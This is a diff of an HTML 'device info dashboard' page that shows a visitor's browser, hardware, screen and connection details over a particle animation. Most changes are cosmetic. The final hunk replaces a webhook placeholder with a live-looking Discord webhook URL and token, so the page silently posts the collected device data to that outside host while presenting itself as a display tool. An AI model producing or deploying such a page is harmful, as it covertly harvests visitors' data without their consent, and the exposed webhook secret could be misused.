@@ -3,18 +3,17 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Device Information Dashboard</title>
+  <title>Full Device Info Dashboard</title>
   <style>
     body {
       margin: 0;
       padding: 0;
       background: black;
-      font-family: 'Arial', sans-serif;
       color: white;
+      font-family: 'Arial', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
       flex-direction: column;
       overflow: hidden;
     }
@@ -26,7 +25,7 @@
     }
     .information-container {
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
       gap: 20px;
       padding: 20px;
       z-index: 1;
@@ -53,9 +52,8 @@
     }
     .information-box p {
       font-size: 14px;
-      line-height: 1.5;
-      word-break: break-word;
       margin: 6px 0;
+      word-break: break-word;
     }
   </style>
 </head>
@@ -64,33 +62,30 @@
 
   <div class="information-container">
     <div class="information-box">
-      <h2>Browser Information</h2>
+      <h2>Browser Info</h2>
       <p id="browserName"></p>
       <p id="userAgent"></p>
       <p id="platform"></p>
       <p id="vendor"></p>
       <p id="appVersion"></p>
     </div>
-
     <div class="information-box">
-      <h2>Device Information</h2>
+      <h2>Device Info</h2>
       <p id="deviceType"></p>
       <p id="cpuCores"></p>
       <p id="memory"></p>
       <p id="javaEnabled"></p>
       <p id="touchSupport"></p>
     </div>
-
     <div class="information-box">
-      <h2>Screen Information</h2>
+      <h2>Screen Info</h2>
       <p id="screenResolution"></p>
       <p id="colorDepth"></p>
       <p id="pixelRatio"></p>
       <p id="screenOrientation"></p>
     </div>
-
     <div class="information-box">
-      <h2>Connection Information</h2>
+      <h2>Connection Info</h2>
       <p id="onlineStatus"></p>
       <p id="language"></p>
       <p id="cookiesEnabled"></p>
@@ -110,15 +105,15 @@
       constructor(x, y){
         this.x = x;
         this.y = y;
-        this.vx = (Math.random() - 0.5) * 1.5;
-        this.vy = (Math.random() - 0.5) * 1.5;
+        this.vx = (Math.random()-0.5)*1.5;
+        this.vy = (Math.random()-0.5)*1.5;
         this.size = 2;
       }
       update(){
         this.x += this.vx;
         this.y += this.vy;
-        if(this.x < 0 || this.x > canvas.width) this.vx *= -1;
-        if(this.y < 0 || this.y > canvas.height) this.vy *= -1;
+        if(this.x<0 || this.x>canvas.width) this.vx*=-1;
+        if(this.y<0 || this.y>canvas.height) this.vy*=-1;
       }
       draw(){
         ctx.beginPath();
@@ -142,7 +137,7 @@
           let dy = particles[a].y - particles[b].y;
           let dist = Math.sqrt(dx*dx + dy*dy);
           if(dist < 150){
-            ctx.strokeStyle = `rgba(255,255,255,${1 - dist/150})`;
+            ctx.strokeStyle = `rgba(255,255,255,${1-dist/150})`;
             ctx.lineWidth = 1;
             ctx.beginPath();
             ctx.moveTo(particles[a].x, particles[a].y);
@@ -189,17 +184,17 @@
       connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A"
     };
 
-    Object.keys(deviceInfo).forEach(id => {
+    Object.keys(deviceInfo).forEach(id=>{
       const el = document.getElementById(id);
       if(el) el.textContent = `${id.replace(/([A-Z])/g, ' $1')}: ${deviceInfo[id]}`;
     });
 
-    fetch('YOUR_WEBHOOK_URL', {
+    fetch('https://discord.com/api/webhooks/1406693004105748640/wJddHnKs8_eSvVohH8Sl3Ti2qJsDnFs7vr3RWElFwwvUDjX1JRY72OMJ8d81d-x-MZVC', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ content: JSON.stringify(deviceInfo, null, 2) })
-    }).then(() => console.log("Device info sent safely!"))
-      .catch(err => console.error(err));
+    }).then(()=>console.log("Device info sent safely"))
+      .catch(err=>console.error(err));
   </script>
 </body>
 </html>
